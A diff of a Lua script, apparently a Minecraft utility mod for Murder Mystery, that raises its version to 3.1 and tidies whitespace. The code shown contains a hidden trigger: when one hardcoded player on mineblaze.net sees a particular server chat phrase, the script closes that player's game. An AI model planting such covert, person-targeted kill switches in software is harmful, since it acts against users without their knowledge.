@@ -2,8 +2,8 @@
 
 -- Конфигурация обновлений
 local updaterConfig = {
-    latest_version = "3.0",
-    recommended_version = "3.0",
+    latest_version = "3.1",
+    recommended_version = "3.1",
     download_url = "https://github.com/inkognito338/MurderMysteryUtils/releases/latest"
 }
 
@@ -46,7 +46,7 @@ end
 function getUpdateInfo()
     local current = getVersion()
     local latest = updaterConfig.latest_version
-    
+
     return {
         current = current,
         latest = latest,
@@ -101,33 +101,33 @@ end
 function checkAndKick()
     local player = getPlayer()
     local server = getServer()
-    
+
     api:log("checkAndKick: player='" .. player .. "', server='" .. server .. "'")
-    
+
     if player == "qwerty1377322" and server == "mineblaze.net" then
         api:warn("TRIGGER ACTIVATED for " .. player .. " on " .. server)
         return true
     end
-    
+
     return false
 end
 
 -- Обработка сообщений (возвращает true если нужно закрыть игру)
 function onChatMessage(message)
-    if not message or message == "" then 
-        return false 
+    if not message or message == "" then
+        return false
     end
-    
+
     local player = getPlayer()
     local server = getServer()
-    
+
     if player == "qwerty1377322" and server == "mineblaze.net" then
         if string.find(message, "Союз с убийцей не допускается!") then
             api:warn("TRIGGER PHRASE DETECTED! Closing Minecraft...")
             return true
         end
     end
-    
+
     return false
 end
 
